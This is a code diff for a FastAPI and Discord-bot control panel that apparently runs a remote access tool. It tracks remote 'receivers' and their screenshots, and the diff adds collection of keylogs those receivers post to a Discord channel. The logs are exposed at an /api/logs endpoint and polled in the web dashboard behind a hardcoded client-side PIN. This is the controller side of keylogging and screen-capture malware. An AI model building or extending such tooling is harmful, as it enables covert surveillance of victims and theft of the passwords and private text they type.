@@ -39,6 +39,7 @@ from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
 COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
 TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
 BOT_TAG = ""  # unused for now; kept for compatibility if needed
 
 assert CONTROLLER_TOKEN
@@ -47,6 +48,7 @@ assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
+_latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
 _receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str}
 _selected_receiver: Optional[str] = None
@@ -113,6 +115,20 @@ async def on_message(message: discord.Message):
                 _latest_screenshot["message_id"] = str(message.id)
                 _latest_screenshot["ts"] = str(message.created_at)
                 break
+    # Track latest key logs posted by receiver
+    if message.channel.id == LOG_CHANNEL_ID and message.content:
+        text = (message.content or "").strip()
+        if text.startswith("```") and text.endswith("```"):
+            inner = text[3:-3]
+            if inner.startswith("\n"):
+                text = inner[1:]
+            elif "\n" in inner:
+                text = inner.split("\n", 1)[1]
+            else:
+                text = inner
+        _latest_keylog["text"] = text
+        _latest_keylog["message_id"] = str(message.id)
+        _latest_keylog["ts"] = str(message.created_at)
     # Track receiver announcements
     if message.channel.id == COMMAND_CHANNEL_ID:
         content = (message.content or "").strip()
@@ -197,9 +213,13 @@ CONTROL_HTML = """<!doctype html>
     .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
     .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
     .panic-btn:active { transform: translateY(1px); }
+    .locked .app { pointer-events: none; filter: blur(1px); }
+    .pin-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 20% 20%, rgba(155,92,255,0.16), transparent 45%), rgba(7,3,15,0.95); z-index: 1200; }
+    .pin-card { width: min(360px, 90vw); background: linear-gradient(145deg, rgba(14,10,26,0.96), rgba(18,14,30,0.99)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 12px 36px rgba(0,0,0,0.4); }
   </style>
 </head>
-<body>
+<body class="locked">
+  <div class="app">
   <div class="layout">
     <div class="card">
       <div class="tabs">
@@ -292,7 +312,47 @@ CONTROL_HTML = """<!doctype html>
     </div>
   </div>
   <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
+  </div>
+  <div id="pin-overlay" class="pin-overlay">
+    <div class="pin-card">
+      <h1>Enter PIN</h1>
+      <p style="margin: 4px 0 12px; color:var(--muted);">PIN required to access controls.</p>
+      <form id="pin-form">
+        <input id="pin-input" type="password" inputmode="numeric" autocomplete="off" placeholder="PIN" required>
+        <button type="submit">Unlock</button>
+      </form>
+      <small id="pin-error" style="color:#f97316;"></small>
+    </div>
+  </div>
   <script>
+    const REQUIRED_PIN = "05701842";
+    const pinOverlay = document.getElementById('pin-overlay');
+    const pinForm = document.getElementById('pin-form');
+    const pinInput = document.getElementById('pin-input');
+    const pinError = document.getElementById('pin-error');
+    function unlockUI() {
+      document.body.classList.remove('locked');
+      if (pinOverlay) pinOverlay.style.display = 'none';
+    }
+    if (pinForm) {
+      pinForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        if (pinInput && pinInput.value === REQUIRED_PIN) {
+          pinError.textContent = '';
+          pinInput.value = '';
+          unlockUI();
+          return;
+        }
+        if (pinError) pinError.textContent = 'Incorrect PIN';
+        if (pinInput) {
+          pinInput.value = '';
+          pinInput.focus();
+        }
+      });
+    }
+    window.addEventListener('load', () => {
+      if (pinInput) pinInput.focus();
+    });
     let selectedReceiver = null;
     async function refreshReceivers() {
       try {
@@ -355,6 +415,18 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    async function refreshLogs() {
+      try {
+        const output = document.getElementById('log-output');
+        if (!output) return;
+        const res = await fetch('/api/logs');
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data.text) {
+          output.textContent = data.text;
+        }
+      } catch (e) { /* ignore */ }
+    }
     // tabs
     const tabButtons = document.querySelectorAll('.tab-btn');
     const tabPanes = document.querySelectorAll('.tab-pane');
@@ -367,8 +439,10 @@ CONTROL_HTML = """<!doctype html>
     activateTab('surprise');
     refreshReceivers();
     refreshScreen();
+    refreshLogs();
     setInterval(refreshReceivers, 5000);
     setInterval(refreshScreen, 4000);
+    setInterval(refreshLogs, 5000);
 
     const panicBtn = document.getElementById('panic-btn');
     if (panicBtn) {
@@ -490,6 +564,10 @@ async def gif_stop():
 @app.get("/api/screenshot")
 async def api_screenshot():
     return JSONResponse(_latest_screenshot)
+
+@app.get("/api/logs")
+async def api_logs():
+    return JSONResponse(_latest_keylog)
 
 @app.get("/api/receivers")
 async def api_receivers():
